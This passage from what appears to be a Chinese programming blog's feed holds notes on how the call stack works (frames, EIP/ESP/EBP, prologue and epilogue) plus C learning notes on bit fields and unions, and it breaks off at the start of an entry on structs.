title="栈(Stack)"></a>栈(Stack)</h4><h5 id="生成过程-1"><a href="#生成过程-1" class="headerlink" title="生成过程"></a>生成过程</h5><p>除了 Heap 以外，其他的内存占用叫做 <strong>Stack（栈）</strong>。简单说，Stack 是由于函数运行而临时占用的内存区域。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/250e3b53dc1aae3bbc27ba4e3360ede217592839.png"></p><p>请看下面的例子。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码中，当系统开始执行<code>main</code>函数时，会为它在内存里面建立一个<strong>帧（frame）</strong>，所有<code>main</code>的内部变量（比如<code>a</code>和<code>b</code>）都保存在这个帧里面。<code>main</code>函数执行结束后，该帧就会被回收，释放所有的内部变量，不再占用空间。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/c60a043eadbb34bd414c4e09aed883ffc2b11401.png" alt="这里的帧main在栈区"></p><p>但当函数内部调用了其他函数时：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">add_a_and_b</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token function">add_a_and_b</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">add_a_and_b</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码中，<code>main</code>函数内部调用了<code>add_a_and_b</code>函数。执行到这一行的时候，系统也会为<code>add_a_and_b</code>新建一个帧，用来储存它的内部变量。也就是说，此时同时存在两个帧：<code>main</code>和<code>add_a_and_b</code>。一般来说，调用栈有多少层，就有多少帧。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/1ade5e44f8f1ec346c1df0b4d87d0dc868bf959d.png"></p><p>等到<code>add_a_and_b</code>运行结束，它的帧就会被回收，系统会回到函数<code>main</code>刚才中断执行的地方，继续往下执行。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。</p><p>所有的帧（Frame）都存放在Stack中，由于帧是一层层叠加的，所以 Stack 叫做栈，生成新的帧，叫做”入栈”（Push），栈的回收叫做”出栈”（Pop），Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做**”后进先出”,(LIFO),(Last in, first out)**的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/02eaa989fa16ebe477ff7f318d04905b9bf345c8.png"></p><p>与这种结构配套的，是一些特定的方法，主要为下面这些。</p><table><thead><tr><th align="left">push：在最顶层加入数据。</th></tr></thead><tbody><tr><td align="left"><strong>pop：返回并移除最顶层的数据。</strong></td></tr><tr><td align="left"><strong>top：返回最顶层数据的值，但不移除它。</strong></td></tr><tr><td align="left"><strong>isempty：返回一个布尔值，表示当前stack是否为空栈。</strong></td></tr></tbody></table><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/18b1164868eb78d031aca565d69a678f52ebbf7a.png"></p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/0a166c1de739907ad9da65ad61762be3cd339c04.png"></p><p>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。比如，内存区域的结束地址是<code>0x8000</code>，第一帧假定是16字节，那么下一次分配的地址就会从<code>0x7FF0</code>开始；第二帧假定需要64字节，那么地址就会移动到<code>0x7FB0</code>。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/43ff4b056e7fee4852cbcbf0c93c431a381d7882.png"></p><h5 id="栈实现的原理"><a href="#栈实现的原理" class="headerlink" title="栈实现的原理"></a>栈实现的原理</h5><h6 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h6><p>先写个小程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello world \n"</span><span class="token punctuation">)</span>；<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一个再简单不过的函数调用的例子了。<br>当程序进行函数调用的时候，我们经常说的是先将函数压栈，当函数调用结束后，再出栈。这一切的工作都是系统帮我们自动完成的。<br>但在完成的过程中，系统会用到下面三种寄存器：（上文有提到）</p><ul><li><strong>EIP</strong> ：EIP寄存器里存储的是CPU下次要执行的指令的地址。当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行。</li><li><strong>ESP</strong> ：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶，由于<strong>栈的地址大小是从上到下从大到小</strong>，所以ESP指在栈的最底端。</li><li><strong>EBP</strong> ：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向**系统栈最上面一个栈帧(即最新push进的栈帧)**的底部，指在栈的最顶端。</li></ul><p><strong>当调用fun函数开始时，三者的作用如下:</strong></p><p>1.EIP寄存器 里存储的是CPU下次要执行的指令的地址（即 printf(“Over”) 的地址）。也就是调用完fun函数后，让CPU知道应该执行main函数中的printf（”Over”）语句了。</p><p>2.EBP寄存器 里存储的是是栈的栈底指针，通常叫栈基址，这个是一开始进行fun()函数调用之前，由ESP传递给EBP的。（在函数调用前可以这么理解：ESP存储的是栈顶地址，也是栈底地址。</p><p>3.ESP寄存器 里存储的是在调用函数fun()之后，栈的栈顶。并且始终指向栈顶。</p><p><strong>当调用fun函数结束后，三者的作用如下：</strong></p><p>1.系统根据 EIP寄存器 里存储的地址，CPU就能够知道函数调用完，下一步应该做什么，也就是应该执行main函数中的printf（“Over”）。</p><p>2.EBP寄存器 存储的是栈底地址，而这个地址是由ESP在函数调用前传递给EBP的。等到调用结束，EBP会把其地址再次传回给ESP。所以ESP又一次指向了函数调用结束后，栈顶的地址。</p><h6 id="EIP-amp-ESP-amp-EBP"><a href="#EIP-amp-ESP-amp-EBP" class="headerlink" title="EIP&amp;ESP&amp;EBP"></a>EIP&amp;ESP&amp;EBP</h6><p>从物理上讲，堆栈是就是一段连续分配的内存空间。在一个程序中，会声明各种变量。静态全局变量是位于数据段并且在程序开始运行的时候被加载。而程序的动态的局部变量则分配在堆栈里面。</p><p>从操作上来讲，堆栈是一个先入后出的队列。他的生长方向与内存的生长方向正好相反。我们规定内存的生长方向为向上，则栈的生长方向为向下。压栈的操作 push＝ESP－4，出栈的操作是 pop = ESP+4 。换句话说，堆栈中老的值，其内存地址，反而比新的值要大。</p><p>在一次函数调用中，堆栈中将被依次压入：参数，返回地址，EBP。如果函数有局部变量，接下来，就在堆栈中开辟相应的空间以构造变量。函数执行结束，这些局部变量的内容将被丢失。但是不被清除。在函数返回的时候，弹出EBP，恢复堆栈到函数调用的地址,弹出返回地址到EIP以继续执行程序。</p><p>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。</p><p>EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；</p><p>ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。</p><p>因此函数中对大部分数据的访问都基于EBP进行。</p><p>为更具描述性，以下称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/8f15cb22525918887ef2a5e3eea7e3661649751f.png" alt=" 函数调用栈的典型内存布局如图"></p><p>图中给出主调函数(caller)和被调函数(callee)的栈帧布局，”m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)。该图基于两个假设：</p><p>第一，函数返回值不是结构体或联合体，否则第一个参数将位于”12(%ebp)” 处；</p><p>第二，每个参数都是4字节大小(栈的粒度为4字节)。参数的传递和大小问题在后面做进一步的探讨。</p><p>此外，函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分。</p><p>从图中可以看出，函数调用时入栈顺序为：</p><p>  <strong>实参N~1</strong> →→ <strong>主调函数返回地址</strong> →→ <strong>主调函数帧基指针EBP</strong> →→  <strong>被调函数局部变量1~N</strong></p><p>其中，主调函数将参数按照调用约定依次入栈，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。</p><p>本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p><p>EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。</p><p>若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下图所示：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/15721bec7224f5bd10fd5ef8104fdf3cd5a89e0f.png"></p><h5 id="堆栈操作"><a href="#堆栈操作" class="headerlink" title="堆栈操作"></a>堆栈操作</h5><p>   函数调用时的具体步骤如下：</p><ol><li>主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。</li></ol><p>   注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。</p><ol start="2"><li><p>主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。</p></li><li><p>若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</p></li><li><p>被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</p></li><li><p>被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</p></li><li><p>一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</p></li><li><p>恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</p></li><li><p>被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</p></li><li><p>主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</p></li></ol><p>   步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p><p>   **压栈(push)**：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。</p><p>   **出栈(pop)**：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节。</p><h4 id="一个比喻"><a href="#一个比喻" class="headerlink" title="一个比喻"></a>一个比喻</h4><p>堆和栈的区别可以引用一位前辈的比喻来看出： </p><p>使用栈就象我们去饭馆里吃饭，只管点菜（发出申请）、付钱、和吃（使用），吃饱了就走，不必理会切菜、洗菜等准备工作和洗碗、刷锅等扫尾工作，他的好处是快捷，但是自由度小。 </p><p>使用堆就象是自己动手做喜欢吃的菜肴，比较麻烦，但是比较符合自己的口味，而且自由度大。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 寄存器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言学习笔记——c位域</title>
      <link href="//post/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94c%E4%BD%8D%E5%9F%9F.html"/>
      <url>//post/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94c%E4%BD%8D%E5%9F%9F.html</url>
      
        <content type="html"><![CDATA[<h1 id="C语言学习笔记1-4"><a href="#C语言学习笔记1-4" class="headerlink" title="C语言学习笔记1.4"></a>C语言学习笔记1.4</h1><h2 id="C位域"><a href="#C位域" class="headerlink" title="C位域"></a>C位域</h2><h3 id="C语言基本知识"><a href="#C语言基本知识" class="headerlink" title="C语言基本知识"></a>C语言基本知识</h3><p>在编写一段C语言代码结构体的过程中，可能会存在某些变量只需要表示开关量，即0或1两个量之一，而C语言中即使是int整形也会占用4个字节，因此，在定义这些变量的时候会使该结构体占用过多的内存空间，导致内存的浪费，而C语言的位域可以很好的处理这个问题。</p><span id="more"></span><p>简单的例子：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//不控制位域；</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> flag1<span class="token punctuation">;</span>    <span class="token keyword">int</span> flag2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>f1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The flag1 = %d ,and the size of f1 is %d\n"</span><span class="token punctuation">,</span>f1<span class="token punctuation">.</span>flag1<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//控制位域为1；</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> flag1 <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> flag2 <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>f2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The flag2 = %d ,and the size of f2 is %d\n"</span><span class="token punctuation">,</span>f2<span class="token punctuation">.</span>flag2<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述例子的运行结果为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">The flag1 <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">,</span>and the size of f1 is <span class="token number">8</span>The flag2 <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span>and the size of f2 is <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里注意，sizeof(f2)并不等于2，而是一个int的长度 4 byte。但若上述程序中将f2.flag1赋值为2，将会造成溢出。</p>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> str </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言学习笔记——C共同体</title>
      <link href="//post/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94C%E5%85%B1%E5%90%8C%E4%BD%93.html"/>
      <url>//post/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94C%E5%85%B1%E5%90%8C%E4%BD%93.html</url>
      
        <content type="html"><![CDATA[<h1 id="C语言学习笔记1-3"><a href="#C语言学习笔记1-3" class="headerlink" title="C语言学习笔记1.3"></a>C语言学习笔记1.3</h1><h2 id="c共同体"><a href="#c共同体" class="headerlink" title="c共同体"></a>c共同体</h2><h3 id="C语言共同体基本知识"><a href="#C语言共同体基本知识" class="headerlink" title="C语言共同体基本知识"></a>C语言共同体基本知识</h3><p><strong>共用体</strong>是一种特殊的数据类型，允许在相同的内存位置存储不同的数据类型。</p><p>可以定义一个带有多成员的共用体，但是任何时候只能有一个成员带有值。共用体提供了一种使用相同的内存位置的有效方式。</p><span id="more"></span><h3 id="定义共用体"><a href="#定义共用体" class="headerlink" title="定义共用体"></a>定义共用体</h3><p>为了定义共用体，使用 <strong>union</strong> 语句，方式与定义结构类似：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">union</span> <span class="token punctuation">[</span><span class="token keyword">union</span> tag<span class="token punctuation">]</span><span class="token punctuation">&#123;</span>    member definition<span class="token punctuation">;</span>    member definition<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    member definition<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span>one or more <span class="token keyword">union</span> variables<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[<strong>union tag</strong>] 是可选的，每个 member definition; 是标准的变量定义，比如 int i; 或者 float f; 或者其他有效的变量定义。在共用体定义的末尾，最后一个分号之前，可以指定一个或多个共用体变量，这是可选的。</p><p>例如定义一个Data共同体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">union</span> data<span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">float</span> f<span class="token punctuation">;</span>    <span class="token keyword">char</span> c<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在，<strong>Data</strong> 类型的变量可以存储一个整数、一个浮点数，或者一个字符串。这意味着一个变量（相同的内存位置）可以存储多个多种类型的数据。您可以根据需要在一个共用体内使用任何内置的或者用户自定义的数据类型。</p><p>共用体占用的内存应足够存储共用体中最大的成员。例如，在上面的实例中，Data 将占用 20 个字节的内存空间，因为在各个成员中，字符串所占用的空间是最大的。</p><p>例如：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token keyword">union</span> data<span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">float</span> f<span class="token punctuation">;</span>    <span class="token keyword">char</span> c<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">union</span> data m<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>c<span class="token punctuation">,</span><span class="token string">"mark0519"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The size of union data m is %d"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">mark0519The size of <span class="token keyword">union</span> data m is <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因为共同体m中字符串c所占的内存空间最大，为20，所以共同体m的内存大小为20。</p><h3 id="访问共用体成员"><a href="#访问共用体成员" class="headerlink" title="访问共用体成员"></a>访问共用体成员</h3><p>和结构体一样，共同体也采用<strong>成员访问运算符（.）</strong>来访问每个成员。简单的例子：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">union</span> data<span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">float</span> f<span class="token punctuation">;</span>    <span class="token keyword">char</span> c<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>m<span class="token punctuation">;</span>m<span class="token punctuation">.</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span>f<span class="token operator">=</span><span class="token number">3.14</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>c<span class="token punctuation">,</span><span class="token string">"mark0519"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但上述赋值操作后，再次调用时却会出现问题，原因是共同体公用内存空间，先把1赋给了m.i，随后又赋值了m.f和m.c，后来的赋值会将原来的值覆盖，使调用m.i和m.f时出现错误，而m.c却没有问题，具体如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token keyword">union</span> data<span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">float</span> f<span class="token punctuation">;</span>    <span class="token keyword">char</span> c<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">union</span> data m<span class="token punctuation">;</span>    m<span class="token punctuation">.</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>m<span class="token punctuation">.</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    m<span class="token punctuation">.</span>f<span class="token operator">=</span><span class="token number">3.14</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%f\n"</span><span class="token punctuation">,</span>m<span class="token punctuation">.</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>c<span class="token punctuation">,</span><span class="token string">"mark0519"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n\n"</span><span class="token punctuation">,</span>m<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"union m is \nint i = %d,\nfloat f = %f \n, char c[20] = %s."</span><span class="token punctuation">,</span>m<span class="token punctuation">.</span>i<span class="token punctuation">,</span>m<span class="token punctuation">.</span>f<span class="token punctuation">,</span>m<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的程序运行后输出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">1</span>           <span class="token comment">//正常输出，因为在同一时间只使用一个变量</span><span class="token number">3.140000</span>    <span class="token comment">//同上</span>mark0519    <span class="token keyword">union</span> m is <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1802658157</span><span class="token punctuation">,</span><span class="token keyword">float</span> f <span class="token operator">=</span> <span class="token number">293020128590682650000000000.000000</span><span class="token punctuation">,</span><span class="token keyword">char</span> c<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> mark0519<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> str </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言学习笔记——C结构体</title>
      <link href="//post/c-learn-struct.html"/>
      <url>//post/c-learn-struct.html</url>
      
